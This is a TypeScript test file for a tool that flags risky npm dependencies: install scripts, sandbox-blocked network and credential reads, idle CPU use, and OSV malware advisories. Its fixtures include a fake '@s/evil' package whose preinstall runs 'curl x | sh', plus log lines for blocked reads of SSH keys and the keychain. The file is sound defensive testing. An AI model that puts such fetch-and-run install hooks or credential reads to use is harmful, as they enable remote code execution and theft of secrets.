import { expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { cpuSeconds, flagLines, installedPackages, malicious, ownInstallScripts, parseDenials, treeUsage } from "./trial-flags.ts";

const pkg = (dir: string, json: object, extra: Record<string, string> = {}) => {
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "package.json"), JSON.stringify(json));
  for (const [f, s] of Object.entries(extra)) writeFileSync(join(dir, f), s);
};

test("installedPackages: install scripts across npm, scoped, nested and pnpm layouts", () => {
  const root = mkdtempSync(join(tmpdir(), "trial-flags-"));
  pkg(root, { name: "app", scripts: { postinstall: "node setup.js", build: "vite build" } });
  pkg(join(root, "node_modules/plain"), { name: "plain", version: "1.0.0", scripts: { test: "x" } });
  pkg(join(root, "node_modules/@s/evil"), { name: "@s/evil", version: "2.0.0", scripts: { preinstall: "curl x | sh" } });
  pkg(join(root, "node_modules/plain/node_modules/deep"), { name: "deep", version: "0.1.0", scripts: { install: "node i.js" } });
  pkg(join(root, "node_modules/native"), { name: "native", version: "3.0.0" }, { "binding.gyp": "{}" });
  pkg(join(root, "node_modules/.pnpm/esbuild@0.25.0/node_modules/esbuild"), { name: "esbuild", version: "0.25.0", scripts: { postinstall: "node install.js" } });
  symlinkSync(join(root, "node_modules/.pnpm/esbuild@0.25.0/node_modules/esbuild"), join(root, "node_modules/esbuild"));
  const got = installedPackages(root);
  expect(got.map((p) => `${p.name}@${p.version}:${p.scripts.join("+")}`)).toEqual([
    "@s/evil@2.0.0:preinstall", "deep@0.1.0:install", "esbuild@0.25.0:postinstall", "native@3.0.0:binding.gyp", "plain@1.0.0:",
  ]);
  expect(ownInstallScripts(root)).toEqual(["postinstall"]);
});

test("parseDenials: this app's blocked network and sensitive reads, deduplicated", () => {
  const tag = "rbtrial:o__r;";
  const ev = (m: string) => JSON.stringify({ eventMessage: m });
  const lines = [
    ev(`Sandbox: node(101) deny(1) network-outbound 93.184.215.14:443\n${tag}`),
    ev(`1 duplicate report for Sandbox: node(101) deny(1) network-outbound 93.184.215.14:443\n${tag}`),
    ev(`Sandbox: node(102) deny(1) network-outbound 127.0.0.1:5432\n${tag}`),
    ev(`Sandbox: curl(107) deny(1) network-outbound remote:*:443\n${tag}`),
    ev(`Sandbox: curl(107) deny(1) network-outbound\n${tag}`),
    ev(`Sandbox: sh(108) deny(1) network-outbound\n${tag}`),
    ev(`Sandbox: sh(103) deny(1) file-read-data /Users/me/.ssh/id_ed25519\n${tag}`),
    ev(`Sandbox: node(104) deny(1) file-read-data /Users/me/Library/Keychains/login.keychain-db\n${tag}`),
    ev(`Sandbox: git(105) deny(1) file-read-data /Users/me/.gitconfig\n${tag}`),
    ev(`Sandbox: node(106) deny(1) network-outbound 1.2.3.4:80\nrbtrial:o__r__apps_web;`), // another app
    "not json",
  ].join("\n");
  expect(parseDenials(lines, tag)).toEqual({
    net: ["curl → port 443", "node → port 443", "sh"],
    reads: ["node read /Users/me/Library/Keychains/login.keychain-db", "sh read /Users/me/.ssh/id_ed25519"],
    other: 1,
  });
});

test("treeUsage: a host and its children, not its siblings", () => {
  expect(cpuSeconds("0:01.50")).toBe(1.5);
  expect(cpuSeconds("1:02:03.00")).toBe(3723);
  expect(cpuSeconds("1-00:00:01")).toBe(86401);
  const ps = ["  10     1   0:01.00  102400", "  11    10   0:02.00   51200", "  12    11   0:00.50   10240", "  13     1   9:00.00  999999"].join("\n");
  expect(treeUsage(ps, 10)).toEqual({ cpu: 3.5, rssMb: 160 });
});

test("malicious: only OSV's MAL- advisories count", async () => {
  const get = (async (_: string, init: RequestInit) => {
    const { queries } = JSON.parse(String(init.body));
    expect(queries[0]).toEqual({ package: { name: "a", ecosystem: "npm" }, version: "1.0.0" });
    return Response.json({ results: [{ vulns: [{ id: "GHSA-xxxx" }] }, { vulns: [{ id: "MAL-2025-1" }] }, {}] });
  }) as unknown as typeof fetch;
  expect(await malicious([{ name: "a", version: "1.0.0" }, { name: "b", version: "6.6.6" }, { name: "c", version: "1.0.0" }], get)).toEqual(["b@6.6.6 (MAL-2025-1)"]);
});

test("flagLines: worst first, long lists cut short", () => {
  expect(flagLines(undefined)).toEqual([]);
  expect(flagLines({ osvError: "osv.dev: 503" })).toEqual([]);
  expect(flagLines({ installScripts: ["a", "b", "c", "d", "e", "f"], malicious: ["x@1 (MAL-1)"], idle: ["spa 180% CPU, 300 MB"] })).toEqual([
    "known-malicious: x@1 (MAL-1)", "busy at idle: spa 180% CPU, 300 MB", "install scripts: a, b, c, d, e and 1 more",
  ]);
});
